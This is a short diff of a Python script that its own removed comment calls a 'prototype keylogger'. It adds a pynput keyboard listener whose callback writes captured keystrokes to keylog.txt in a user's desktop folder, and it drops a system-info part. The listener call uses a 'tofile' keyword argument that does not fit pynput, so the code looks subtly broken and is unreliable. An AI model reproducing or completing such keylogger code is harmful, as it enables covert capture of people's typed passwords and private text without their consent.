@@ -1,10 +1,7 @@
-#prototype keylogger prints system info 
-
-from requests import get
+from pynput import keyboard
 
 log = 'keylog.txt'
-sys = 'sysinfo.txt'
-path = "C:\Users\HP\Desktop\ACM"
+path = "C:\\Users\\HP\\Desktop\\ACM"
 add = '\\'
 
 key = ''
@@ -20,3 +17,6 @@ def tofile(key):
         else:
             file.write(key)
             file.close()
+
+with keyboard.Listener(tofile = tofile) as listener:
+    listener.join()
